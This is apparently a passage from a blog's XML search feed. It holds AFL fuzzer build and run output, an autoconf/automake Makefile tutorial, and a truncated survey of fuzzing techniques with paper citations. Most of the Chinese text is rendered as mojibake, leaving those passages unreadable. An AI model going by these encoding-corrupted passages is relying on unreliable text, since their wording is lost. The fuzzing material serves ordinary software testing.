operator">=</span> <span class="token number">212</span> us<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All <span class="token builtin class-name">test</span> cases processed.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Here are some useful stats:    Test <span class="token keyword">case</span> count <span class="token builtin class-name">:</span> <span class="token number">1</span> favored, <span class="token number">0</span> variable, <span class="token number">1</span> total       Bitmap range <span class="token builtin class-name">:</span> <span class="token number">15</span> to <span class="token number">15</span> bits <span class="token punctuation">(</span>average: <span class="token number">15.00</span> bits<span class="token punctuation">)</span>        Exec timing <span class="token builtin class-name">:</span> <span class="token number">212</span> to <span class="token number">212</span> us <span class="token punctuation">(</span>average: <span class="token number">212</span> us<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> No -t option specified, so I'll use <span class="token builtin class-name">exec</span> <span class="token function">timeout</span> of <span class="token number">20</span> ms.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All <span class="token builtin class-name">set</span> and ready to roll<span class="token operator">!</span></code></pre><p><img src="https://s2.loli.net/2022/04/09/5MWHpylXSQdutNs.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/5MWHpylXSQdutNs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409173924093"></p><h4 id="crash-3">crash</h4><p><img src="https://s2.loli.net/2022/04/09/42QSkZyDRvE9scV.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/42QSkZyDRvE9scV.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409174042577"></p><h4 id="plot-3">plot</h4><p><img src="https://s2.loli.net/2022/04/09/DVgvcniK7sxuZlr.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/DVgvcniK7sxuZlr.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409175654831"></p><h3 id="ä½¿ç”¨afl-clang-fast">ä½¿ç”¨<code>afl-clang-fast</code>++</h3><pre class="language-shell" data-language="shell"><code class="language-shell">root@0187031113b5:/home/workhome/afl-test/ins-c++<span class="token comment"># afl-clang-fast++ -g -o afltestc++clang afltestc++.cpp</span>afl-clang-fast <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lszekeres@google.com<span class="token operator">></span>afl-llvm-pass <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lszekeres@google.com<span class="token operator">></span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Instrumented <span class="token number">127</span> locations <span class="token punctuation">(</span>non-hardened mode, ratio <span class="token number">100</span>%<span class="token punctuation">)</span>.</code></pre><p><img src="https://s2.loli.net/2022/04/09/amPrf153LI6QMVF.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/amPrf153LI6QMVF.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409173933365"></p><h4 id="crash-4">crash</h4><p><img src="https://s2.loli.net/2022/04/09/QFZKcG1nihuBXH4.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/QFZKcG1nihuBXH4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409174149786"></p><h4 id="plot-4">plot</h4><p><img src="https://s2.loli.net/2022/04/09/4tLJcNTPnIuHmvY.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/4tLJcNTPnIuHmvY.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409174621876"></p></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> è®ºæ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> è®ºæ–‡ </tag>
            
            <tag> AFL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux ä¸‹C/C++ ç”ŸæˆConfigure å’ŒMakefile</title>
      <link href="/posts/f4dff8fd/"/>
      <url>/posts/f4dff8fd/</url>
      
        <content type="html"><![CDATA[<h1>linux ä¸‹C/C++ ç”ŸæˆConfigure å’ŒMakefile</h1><h2 id="å‰æï¼š">å‰æï¼š</h2><div class="story post-story"><p>automake</p></div><h2 id="ç®€è¦æ­¥éª¤">ç®€è¦æ­¥éª¤</h2><div class="story post-story"><ol><li><p>ç¼–å†™test.c</p></li><li><p>è¿è¡Œ<code>autoscan</code></p></li><li><p>è¿è¡Œ<code>mv configure.scan configure.ac</code></p></li><li><p>ä¿®æ”¹<code>configure.ac</code>ä¸­å†…å®¹</p><pre class="language-none"><code class="language-none"># -*- Autoconf -*-# Process this file with autoconf to produce a configure script. AC_PREREQ([2.69])AC_INIT(test, 1.0, sizaif@mail.com)AC_CONFIG_SRCDIR([test.cpp])AC_CONFIG_HEADERS([config.h])AM_INIT_AUTOMAKE # å¢åŠ # Checks for programs.AC_PROG_CXXAC_PROG_CC # Checks for libraries. # Checks for header files. # Checks for typedefs, structures, and compiler characteristics.AC_TYPE_SIZE_T # Checks for library functions.AC_CONFIG_FILES([Makefile])</code></pre></li><li><p>è¿è¡Œ<code>aclocal</code></p></li><li><p>åˆ›å»º<code>Makefile.am</code></p><pre class="language-none"><code class="language-none">AUTOMAKE_OPTIONS&#x3D;foreign # å›ºå®šå†™æ³•bin_PROGRAMS&#x3D;test # ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶åç§°test_SOURCES&#x3D;test.c # å¯æ‰§è¡Œæ–‡ä»¶åç§°_SOURCES</code></pre></li><li><p>è¿è¡Œ<code>automake --add-missing</code></p></li><li><p>è¿è¡Œ<code>autoconf</code> ç”Ÿæˆ<code>configure</code> æ–‡ä»¶</p></li><li><p>æ‰§è¡Œ<code>./configure</code>å°±å¯ä»¥å¾—åˆ°<code>Makefile</code> , ä»¥åŠ<code>config.h</code>æ–‡ä»¶</p></li></ol></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> make </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯</title>
      <link href="/posts/d619a3ee/"/>
      <url>/posts/d619a3ee/</url>
      
        <content type="html"><![CDATA[<h1>æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯</h1><blockquote><p>2022-01-09-</p></blockquote><p>[TOC]</p><p>æ¨¡ç³Šæµ‹è¯•åŸºæœ¬æµç¨‹:  é¢„å¤„ç†(preprocessing)ã€è¾“å…¥æ•°æ®æ„é€ (input building)ã€è¾“å…¥é€‰æ‹©(input selection)ã€è¯„ä¼°(evalution)ã€ç»“æœåˆ†æ(post-fuzzing)</p><p>2013å¹´AFLè¯ç”Ÿ,åŸºäº<font color='red'>è¦†ç›–ç‡å¼•å¯¼</font>çš„æ¨¡ç³Šæµ‹è¯•æˆä¸ºä¸»æµæ–¹å‘</p><p>AFL æ˜¯è¦†ç›–ç‡ä¸ºå¯¼å‘çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·,é€šè¿‡æ’æ¡©çš„æ–¹æ³•,é‡‡é›†è¾“å…¥æ•°æ®å¯¹åº”çš„è¾¹è¦†ç›–ç‡,ä½œä¸ºæ¨¡ç³Šæµ‹è¯•ç§å­é€‰å–çš„è¡¡é‡æŒ‡æ ‡ï¼é€šè¿‡ä½¿ç”¨è¿›åŒ–ç®—æ³•ä»¥åŠç²¾å¿ƒæ„é€ çš„çªå˜ç­–ç•¥</p><h2 id="é¢„å¤„ç†">é¢„å¤„ç†</h2><div class="story post-story"><p>å·¥ä½œ: <strong>æœé›†ç›®æ ‡ç›¸å…³ä¿¡æ¯</strong>å¹¶åˆ¶å®šæ¨¡ç³Šæµ‹è¯•çš„ç­–ç•¥, ä¸ºç›‘æ§ç›®æ ‡åœ¨æµ‹è¯•ä¸­çš„è¿è¡ŒçŠ¶æ€åšå¿…è¦çš„å‡†å¤‡ï¼é€šå¸¸ä¾èµ–äº<font color='red'>æ’æ¡©ã€ç¬¦å·æ‰§è¡Œä»¥åŠæ±¡ç‚¹åˆ†æ</font>è¿™ç±»ç¨‹åºåˆ†ææŠ€æœ¯</p><p>æœé›†ç›®æ ‡ç›¸å…³ä¿¡æ¯,æ¯”å¦‚ç›®æ ‡çš„è¾“å…¥æ•°æ®æ ¼å¼ã€ç›®æ ‡çš„å†…éƒ¨ç»“æ„,å¹¶ä¸ºç›‘æ§æµ‹è¯•ä¸­ç›®æ ‡çš„çŠ¶æ€å˜åŒ–åšå¿…è¦çš„å‡†å¤‡ï¼è¯¥ç¯èŠ‚é¢ä¸´çš„æŒ‘æˆ˜æ˜¯:ä½¿ç”¨ä»€ä¹ˆç¨‹åºåˆ†ææŠ€æœ¯,ä»¥åŠæ¨¡ç³Šæµ‹è¯•ç©¶ç«Ÿéœ€è¦å¯¹ç›®æ ‡å†…éƒ¨ä¿¡æ¯æœ‰å¤šè¯¦ç»†çš„äº†è§£</p><p>æ ¹æ®æ¨¡ç³Šæµ‹è¯•å¯¹ç¨‹åºå†…éƒ¨ä¿¡æ¯åˆ†æçš„ç¨‹åº¦,ç°ä»£çš„æ¨¡ç³Šæµ‹è¯•æ–¹æ³•å¯ä»¥åˆ’åˆ†ä¸ºï¼“ç±»:<font color='orange'>é»‘ç›’æ¨¡ç³Šæµ‹è¯• (blackï¼§boxfuzzing)ã€ç°ç›’æ¨¡ç³Šæµ‹è¯•(greyï¼§boxfuzzing) å’Œç™½ç›’æ¨¡ç³Šæµ‹è¯•(whiteï¼§boxfuzzing)</font></p><h3 id="1-æ’æ¡©">1. æ’æ¡©:</h3><p>æ’æ¡©æŠ€æœ¯é€šè¿‡å‘ç›®æ ‡çš„ä»£ç ä¸­åˆé€‚çš„ä½ç½®æ·»åŠ é¢„è®¾å¥½çš„ä»£ç ,è·å¾—ç¨‹åºçš„é™æ€æˆ–åŠ¨æ€æ‰§è¡Œä¿¡æ¯ï¼æ¯”å¦‚ç¨‹åºçš„æŠ½è±¡è¯­æ³•æ ‘,è¦†ç›–ç‡ä»¥åŠå‡½æ•°å†…å˜é‡å–å€¼ç­‰</p><p><strong>åŠ¨æ€æ’æ¡©</strong></p><p>åŠ¨æ€æ’æ¡©åˆ™æ˜¯åœ¨è¿è¡Œçš„è¿‡ç¨‹ä¸­å¯¹è¿è¡Œè¿‡çš„ä»£ç  è¿›è¡Œæ’æ¡©ï¼æ¯”å¦‚åˆ©ç”¨ QEMUç­‰æ¨¡æ‹ŸæŠ€æœ¯,è¿›è¡ŒåŠ¨æ€æ’æ¡©,å¯ä»¥è·å¾—ç¨‹åºè¿è¡Œæ—¶çš„ä¿¡æ¯,<font color='green'>ç¼ºç‚¹æ˜¯èµ„æºçš„å¼€é”€å¤§</font></p><p><strong>é™æ€æ’æ¡©</strong></p><p>é€šè¿‡ GCCç¼–è¯‘å™¨åœ¨æ±‡ç¼–è¯­è¨€ä¸Šæ’ æ¡©,LLVMåœ¨ç”Ÿæˆçš„ä¸­é—´è¯­è¨€LLVMIR(low level virtual machine intermediate representation)ä¸Šæ’æ¡©ï¼<font color='green'>ä¼˜ç‚¹æ˜¯èŠ‚çœæ—¶é—´ã€é€Ÿåº¦å¿«,ç¼ºç‚¹æ˜¯ä¾èµ–äºç¨‹åºæºç ï¼</font></p><p><font color='red'>æ’æ¡©æŠ€æœ¯çš„ç¼ºç‚¹æ˜¯ä¼šå¸¦æ¥èµ„æºçš„å¼€é”€</font></p><h3 id="2-ç¬¦å·æ‰§è¡Œ">2. ç¬¦å·æ‰§è¡Œ</h3><p>å°†ç¨‹åºè¡Œä¸ºçš„æ¨ç†å½’ç»“ä¸ºé€»è¾‘é¢†åŸŸçš„æ¨ç†,é€šè¿‡æ„å»ºä¸€ä¸ªè¡¨ç¤ºç¨‹åºæ‰§è¡Œçš„é€»è¾‘å…¬å¼,å¯ä»¥åŒæ—¶æ¨æ–­ä¸€ä¸ªç¨‹åºåœ¨ä¸åŒè¾“å…¥ä¸Šçš„è¡Œä¸ºï¼</p><blockquote><p>è¯¥æ–¹æ³•å¯ä»¥ä½¿æ¨¡ç³Šæµ‹è¯•è·å¾—è¾ƒå¥½çš„è¦†ç›–ç‡,å¹¶å¯ä»¥æ·±å…¥åˆ°ç¨‹åºæ·±å¤„,æ¢å¯»å¯èƒ½å­˜åœ¨æ¼æ´çš„åŒºåŸŸ</p></blockquote><p><strong>é™æ€ç¬¦å·æ‰§è¡Œ</strong></p><p><font color='purple'>é™æ€ç¬¦å·æ‰§è¡Œé€šå¸¸ä¼šå› ä¸ºç¨‹åºä¸­å¾ªç¯å’Œé€’å½’çš„å­˜åœ¨,é™·å…¥åˆ°è·¯å¾„çˆ†ç‚¸ä¸­,è¿˜ä¼šå› ä¸ºè·¯å¾„çº¦æŸä¸­åŒ…å«è¯¸å¦‚å–Hashå€¼ç­‰æ“ä½œ,å¯¼è‡´çº¦æŸæ±‚è§£å¤±è´¥ï¼</font>ç”±äºå­˜åœ¨è¿™2ç§é—®é¢˜,ä½¿ç”¨è¾ƒå¤šçš„æ˜¯åŠ¨æ€ç¬¦å·æ‰§è¡Œ</p><p><strong>åŠ¨æ€ç¬¦å·æ‰§è¡Œ</strong></p><p>åŠ¨æ€ç¬¦å·æ‰§è¡Œé€šè¿‡å¯¹ç¨‹åºè¿›è¡Œ<strong>å®é™…æ‰§è¡Œä¸ç¬¦å·åŒ–æ‰§è¡Œ</strong>,ç»´æŠ¤ç¨‹åºçš„å®é™…çŠ¶æ€å’Œç¬¦å·åŒ–çŠ¶æ€,<font color='red'>é€šè¿‡å°†éš¾ä»¥æ±‚è§£çš„çº¦æŸæ›¿æ¢ä¸ºå®é™…å€¼</font>,ç¼“è§£äº†é™æ€ç¬¦å·æ‰§è¡Œçš„é—®é¢˜,å¹¶æŒ‰ç…§<font color='red'>æ·±åº¦ä¼˜å…ˆ</font>çš„æœç´¢ç­–ç•¥å¯¹ç›®æ ‡ç¨‹åºè¿›è¡Œäº†æ¢ç´¢ï¼</p><p>å­˜åœ¨çš„é—®é¢˜:</p><p>â‘ ç”±äºç¨‹åºåˆ†æ”¯çš„å­˜åœ¨,è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ä»ç„¶å­˜åœ¨,ç¨‹åºè¶Šå¤æ‚, è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜å°±è¶Šä¸¥é‡ï¼<font color='orange'>è§£å†³çš„ä¸€ç§åŠæ³•æ˜¯é€šè¿‡å¯å‘å¼çš„æ–¹æ³•,é€‰æ‹©æ¯”è¾ƒé‡è¦çš„è·¯å¾„è¿›è¡Œæ¢ç´¢ï¼</font></p><p>â‘¡è™½ç„¶åŠ¨æ€ç¬¦å·æ‰§è¡Œä½¿ç”¨å®é™…å€¼æ›¿æ¢çš„æ–¹æ³•,è§£å†³äº†ä¸€ éƒ¨åˆ†é™æ€ç¬¦å·æ‰§è¡Œæ— æ³•ç»•è¿‡çš„çº¦æŸ,ä½†æ˜¯ä¹Ÿä¼šä¸¢å¤± ä¸€äº›è·¯å¾„,é€ æˆæ¢ç´¢ç»“æœçš„ä¸å®Œæ•´ï¼</p><p>â‘¢æ‰€æœ‰çš„ç¬¦å·æ‰§è¡ŒæŠ€æœ¯éƒ½å—é™äºçº¦æŸæ±‚è§£æ–¹æ³•çš„èƒ½åŠ›,æ¯”å¦‚å¦‚ä½•å¤„ç†ç±»ä¼¼å–ä½™æ“ä½œè¿™æ ·çš„éçº¿æ€§çº¦æŸ,ä»ç„¶æ˜¯ç¬¦å·æ‰§è¡Œé¢ä¸´çš„æŒ‘æˆ˜</p><blockquote><p>ä¸ºäº†èƒ½å¤Ÿå°†ç¬¦å·æ‰§è¡Œæ›´å¥½åœ°åº”ç”¨åˆ°æ¨¡ç³Šæµ‹è¯•ä¸­,è¿‘å¹´æ¥è¯ç”Ÿäº†ä¸€äº›å·¥ä½œ,</p><p>æ¯”å¦‚Pangolin é€šè¿‡ [22] å…è®¸ç¬¦å·æ‰§è¡Œé‡ç”¨ä¹‹å‰çš„è®¡ç®—ç»“æœ,</p><p>Intrigueré€š [23]è¿‡åˆ©ç”¨å­—æ®µçº§çš„ä¿¡æ¯,éƒ½å®ç°äº†å¯¹ç¬¦å·æ‰§è¡Œè¿‡ç¨‹çš„åŠ é€Ÿï¼</p><p>ILF[24] é€šè¿‡ä½¿ç”¨ç¥ç»ç½‘ç»œ,å¯¹ç”±ç¬¦å·æ‰§è¡Œä¸“å®¶ç”Ÿæˆçš„å¤§é‡é«˜è´¨é‡è¾“å…¥æ•°æ®è¿›è¡Œå­¦ä¹ ,å¾—åˆ°äº†åˆé€‚ çš„æ¨¡ç³Šæµ‹è¯•ç­–ç•¥<br>[ï¼’ï¼’] Huang Heqing,Yao Peisen,Wu Rongxin,et alï¼Pangolin incremental hybrid fuzzing with polyhedral path abstraction [C]âˆ•âˆ• Procoftheï¼’ï¼ï¼’ï¼IEEE Sympon Security and Privacy (SP)ï¼Piscataway,NJ:IEEE,ï¼’ï¼ï¼’ï¼:ï¼‘ï¼–ï¼‘ï¼“ï¼‘ï¼–ï¼’ï¼—<br>[ï¼’ï¼“] Cho M,Kim S,Kwon Tï¼Intriguer field-level constraint solving for hybrid fuzzing [C]âˆ•âˆ• procoftheï¼’ï¼ï¼‘ï¼™ ACM SIGSAC Conf on Computer and Communications Securityï¼ New York: ACM,ï¼’ï¼ï¼‘ï¼™:ï¼•ï¼‘ï¼•ï¼•ï¼“ï¼<br>[ï¼’ï¼”] He Jingxuan,Balunovi M,AmbroladzeN,et alï¼Learning to fuzz from symbolic execution with application to smart contracts[C]âˆ•âˆ•Procoftheï¼’ï¼ï¼‘ï¼™ ACM SIGSAC Conf on Computer and Communications Securityï¼New York:A CM, ï¼’ï¼ï¼‘ï¼™:ï¼•ï¼“ï¼‘ï¼•ï¼”ï¼˜</p></blockquote><h3 id="3-æ±¡ç‚¹åˆ†æ">3. æ±¡ç‚¹åˆ†æ</h3><p>è¯¥æŠ€æœ¯ä¼šè§‚æµ‹ç¨‹åºä¸­,å“ªäº›ç¨‹åºæ•°æ®å—åˆ°äº†é¢„å…ˆå‡†å¤‡å¥½çš„æ±¡æŸ“æº(æ¯”å¦‚è¾“å…¥)çš„æ±¡æŸ“,ç›®çš„æ˜¯è·Ÿè¸ªæ±¡æŸ“æºå’Œæ±‡èšç‚¹(æ¯”å¦‚æœ‰æ•æ„Ÿä¿¡æ¯çš„ç¨‹åºæ•°æ®)ä¹‹é—´çš„ä¿¡æ¯æµ</p><p><strong>é™æ€æ±¡ç‚¹åˆ†æ</strong></p><p>é™æ€æ±¡ç‚¹åˆ†æä¸éœ€è¦ç¨‹åºå®é™…è¿è¡Œ,é€šè¿‡å¯¹ç¨‹åºé™æ€åˆ†æ,è·å¾—ç¨‹åºæ§åˆ¶æµå›¾ã€æŠ½è±¡è¯­æ³•æ ‘ç­‰ä¿¡æ¯, ä¾æ®æ•°æ®æµä»¥åŠä¾èµ–å…³ç³»è¿›è¡Œæ±¡ç‚¹åˆ†æ;</p><p><strong>åŠ¨æ€æ±¡ç‚¹åˆ†æ</strong></p><p>åŠ¨æ€æ±¡ç‚¹åˆ†æåˆ™æ˜¯åœ¨ç¨‹åºå®é™…æ‰§è¡Œçš„è¿‡ç¨‹ä¸­,åˆ©ç”¨ç¨‹åºçš„åŠ¨æ€æ‰§è¡Œä¿¡æ¯è¿›è¡Œæ±¡ç‚¹åˆ†æ</p><p><font color='red'>åŠ¨æ€æ±¡ç‚¹åˆ†ææ£€æµ‹çš„å¯ä¿¡åº¦æ›´é«˜,ä½†æ˜¯æ£€æµ‹ç»“æœæ˜¯å¦å…¨é¢, å–å†³äºåŠ¨æ€æ±¡ç‚¹åˆ†æå¯¹ç¨‹åºçš„è¦†ç›–æƒ…å†µ,è€Œä¸”åŠ¨æ€æ±¡ç‚¹åˆ†æä¼šæ¶ˆè€—æ›´å¤šçš„èµ„æº; é™æ€æ±¡ç‚¹åˆ†æåˆä¼šå’Œç¬¦å·æ‰§è¡Œä¸€æ ·,å¯èƒ½ä¼šé™·å…¥åˆ°è·¯å¾„çˆ†ç‚¸ä¸­,è€Œç®€åŒ–åçš„é™æ€æ±¡ç‚¹åˆ†æåˆå­˜åœ¨ç€ä¸¥é‡çš„è¿‡åº¦æ±¡æŸ“é—®é¢˜</font></p><blockquote><p>å°†æ±¡ç‚¹åˆ†ææŠ€æœ¯åº”ç”¨åˆ°æ¨¡ç³Šæµ‹è¯•ä¸­,å¹¶é™ä½å…¶èµ„æºæ¶ˆè€—æ˜¯è¿‘å¹´æ¥çš„é‡è¦ç ”ç©¶æ–¹å‘ï¼æ¯”å¦‚GREYONE [ï¼’ï¼•]å°è¯•é€šè¿‡å‡å°‘æ±¡ç‚¹åˆ†æè·Ÿè¸ªçš„å¯¹è±¡ã€é™ä½æ±¡ç‚¹åˆ†æçš„å¼€é”€ã€æå‡æ¨¡ç³Šæµ‹è¯•çš„æ£€æµ‹æ•ˆç‡ï¼</p><p>[ï¼’ï¼•] GanShuitao,ZhangChao,ChenPeng,etalï¼GREYONE dataflowsensitivefuzzing[C]âˆ•âˆ•Procoftheï¼’ï¼™thUSENIX SecuritySymposiumï¼Berkeley,CA:USENIXAssociation, ï¼’ï¼ï¼’ï¼:ï¼’ï¼•ï¼—ï¼—ï¼’ï¼•ï¼™ï¼”</p></blockquote></div><h2 id="åŸºäºAFLçš„æ¨¡ç³Šæµ‹è¯•æ–¹æ³•">åŸºäºAFLçš„æ¨¡ç³Šæµ‹è¯•æ–¹æ³•</h2><div class="story post-story"><p><img src="https://s2.loli.net/2022/01/09/MzWb9LFIg58cjJm.png" class="lazyload" data-srcset="https://s2.loli.net/2022/01/09/MzWb9LFIg58cjJm.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220109150026279"></p><p><img src="https://s2.loli.net/2022/01/09/g5TyonYkvzxDFui.png" class="lazyload" data-srcset="https://s2.loli.net/2022/01/09/g5TyonYkvzxDFui.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220109150051850"></p><p><img src="https://s2.loli.net/2022/01/09/KxD8LUgl1sQbZC9.png" class="lazyload" data-srcset="https://s2.loli.net/2022/01/09/KxD8LUgl1sQbZC9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220109150137214"></p></div><h2 id="è¾“å…¥æ„é€ ">è¾“å…¥æ„é€ </h2><div class="story post-story"><pre><code>ç§å­è·å–ã€ç§å­ç­›é€‰ã€ç§å­çªå˜</code></pre><p><font color='cornflowerblue'>å…·ä½“çš„æŒ‘æˆ˜æ˜¯å¦‚ä½•åœ¨å°½é‡æ»¡è¶³è¯­æ³•è¯­ä¹‰æ£€æŸ¥çš„æƒ…å†µä¸‹,çŸ­æ—¶é—´å†…ç”Ÿæˆ å¤§é‡çš„è¾“å…¥,ç”¨ä»¥å¯¹ç›®æ ‡åšå…¨é¢è€Œæ·±å…¥åˆ†æï¼</font></p><p><font color='green'>é¦–å…ˆå¾—åˆ°ä¸€ä¸ªæ•°æ®Â $S$ ,ç„¶åæ•°æ® $S$ æŒ‰ç…§ä¸€ å®šçš„ç­–ç•¥è¿›è¡Œä¸€å®šæ¬¡æ•°çš„å˜å¼‚,è·å¾—å¤§é‡æ–°æ•°æ®Â $I$ , æœ€åå°†$I$è¾“å…¥åˆ°è¢«æµ‹è¯•å¯¹è±¡ä¸­è¿›è¡Œæµ‹è¯•ï¼å…¶ä¸­æ•°æ® $S$ è¢«ç§°ä¸ºç§å­(seed),Â $I$ æ˜¯æµ‹è¯•å®é™…ä½¿ç”¨çš„è¾“å…¥æ•°æ®</font></p></div><h2 id="è¯„ä¼°">è¯„ä¼°</h2><div class="story post-story"><p>ç°é˜¶æ®µçš„ç ”ç©¶éƒ½ä¼šèšç„¦äºæ¨¡ç³Šæµ‹è¯•å™¨åœ¨ï¼’ä¸ªæŒ‡æ ‡ä¸Šçš„è¡¨ç°:<font color='red'>è¦†ç›–ç‡å’Œæš´éœ²æ¼æ´å¹³å‡æ—¶é—´</font></p><p><font color='cornflowerblue'>è¦†ç›–ç‡æ˜¯è½¯ä»¶æµ‹è¯•ä¸­çš„ä¸€ä¸ªè¡¡é‡æŒ‡æ ‡,æŒ‡çš„æ˜¯åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­,å¯¹è±¡è¢«è¦†ç›–åˆ°çš„æ•°ç›®å æ€»æ•°çš„æ¯”ä¾‹ï¼ é€šå¸¸è€Œè¨€,é«˜è¦†ç›–ç‡æ›´å¯èƒ½å‘ç°æ›´å¤šçš„éšè—æ¼æ´,ä¼—å¤šç ”ç©¶å› æ­¤é›†ä¸­åœ¨è¦†ç›–ç‡æå‡ä¸Š</font></p><p>AFL ä½¿ç”¨ä¸Šä¸‹æ–‡æ— å…³çš„è¾¹è¦†ç›–ç‡ä½œä¸ºè¯„ä¼°æŒ‡æ ‡ï¼ [13]</p><p>Angora ä½¿ç”¨ä¸Šä¸‹æ–‡æ•æ„Ÿçš„åˆ†æ”¯è¦†ç›–ç‡ï¼[42]</p><p>VUzzer ä½¿ç”¨äº†å—è¦†ç›–ç‡æ›¿ä»£è¾¹è¦†ç›–ç‡ä½œä¸ºè¦†ç›–ç‡è¯„ä¼°çš„å¯¹è±¡ï¼[41]</p><p>æš´éœ²æ¼æ´å¹³å‡æ—¶é—´:</p><blockquote><p>æš´éœ² æ¼ æ´ å¹³ å‡ æ—¶ é—´ è¢« BÃ¶hmeï¼”ï¼–] AFLGo é€‰ åš è¯„ ä¼° æŒ‡ æ ‡ï¼åœ¨ ä¸ åŸº å‡† æ¨¡ ç³Š å·¥ å…· [ï¼”ï¼–] AFL çš„å¯¹æ¯”å®éªŒä¸­,AFLGo å¤ç°å•ä¸ªæ¼æ´çš„ [ï¼‘ï¼“] [ï¼”ï¼–] æ—¶é—´è¿œæ¯”AFLå°‘,è¿™è¯æ˜äº†è¯¥è¯„ä¼°æŒ‡æ ‡çš„æœ‰æ•ˆæ€§ï¼ æ­¤åHawakeye[ï¼”ï¼—] åŒæ ·ä½¿ç”¨äº†è¿™ä¸€æŒ‡æ ‡æ¥è¯æ˜å…¶æ€§ èƒ½ï¼Parmesan åœ¨é€šè¿‡sanitizeræ¥å‘ç°æ½œåœ¨æ¼æ´çš„ [ï¼–ï¼“] ç ”ç©¶å·¥ä½œä¸­,ä¹Ÿæ˜¯ç”¨æš´éœ²æ¼æ´å¹³å‡æ—¶é—´ä½œä¸ºè¯„ä¼°æŒ‡ æ ‡åŒAngora [ï¼”ï¼’] ç­‰å®šå‘ç°ç›’æ¨¡ç³Šå·¥å…·è¿›è¡Œæ¯”è¾ƒ</p></blockquote></div><h2 id="ç»“æœåˆ†æ">ç»“æœåˆ†æ</h2><div class="story post-story"><p>ç»“æœåˆ†æå‘ç”Ÿåœ¨æ¨¡ç³Šæµ‹è¯•ç»“æŸä»¥å,ä¸»è¦ç›®çš„æ˜¯å¯¹äºæ¨¡ç³Šæµ‹è¯•çš„è¾“å‡ºä¿¡æ¯è¿›è¡Œåˆ†æå’Œå¤„ç†</p></div><h2 id="å…·ä½“åº”ç”¨åœºæ™¯ä¸‹çš„æ¨¡ç³Šæµ‹è¯•">å…·ä½“åº”ç”¨åœºæ™¯ä¸‹çš„æ¨¡ç³Šæµ‹è¯•</h2><div class="story post-story"><h3 id="ç‰©è”ç½‘ä¸­çš„æ¨¡ç³Šæµ‹è¯•">ç‰©è”ç½‘ä¸­çš„æ¨¡ç³Šæµ‹è¯•</h3><p>ä¸»è¦é¢ä¸´ä¸¤ä¸ªé—®é¢˜:</p><ol><li>å°†æ¨¡ç³Šæµ‹è¯•åº”ç”¨åˆ°ç‰©è”ç½‘é¢†åŸŸé—®é¢˜å°±æ˜¯ç‰¹å®šç‰©è”ç½‘è®¾å¤‡ä¸Šè¿è¡Œçš„ç¨‹åºé€šå¸¸å¯¹äºå…¶å®é™…ç¡¬ä»¶çš„é…ç½®æœ‰ç€é«˜åº¦çš„ä¾èµ–æ€§ï¼</li></ol><p>â€‹ç®€å•çš„ä»å›ºä»¶ä¸­æå–ä¸€ä¸ªç”¨æˆ·çº§åˆ«çš„ç¨‹åº,ç„¶åä½¿ç”¨æ¨¡ç³Šæµ‹è¯•è¿›è¡Œæ£€æµ‹,é€šå¸¸æ˜¯è¡Œä¸é€šçš„</p><blockquote><p>Iot-Fuzzer[ï¼“ï¼] è®¤ä¸ºå¤§å¤šæ•°ç‰©è”ç½‘è®¾å¤‡é€šè¿‡å…¶å®˜æ–¹ç§»åŠ¨åº”ç”¨ç¨‹åºè¿›è¡Œæ§åˆ¶,å¹¶ä¸”æ­¤ç±»åº”ç”¨ç¨‹åºé€šå¸¸åŒ…å«æœ‰ä¸è®¾å¤‡è¿›è¡Œé€šä¿¡æ‰€ä½¿ç”¨åè®®çš„ä¸°å¯Œä¿¡æ¯,å› æ­¤é€šè¿‡è¯†åˆ«å’Œé‡ç”¨ç‰¹å®šäºç¨‹åºçš„é€»è¾‘(æ¯”å¦‚åŠ 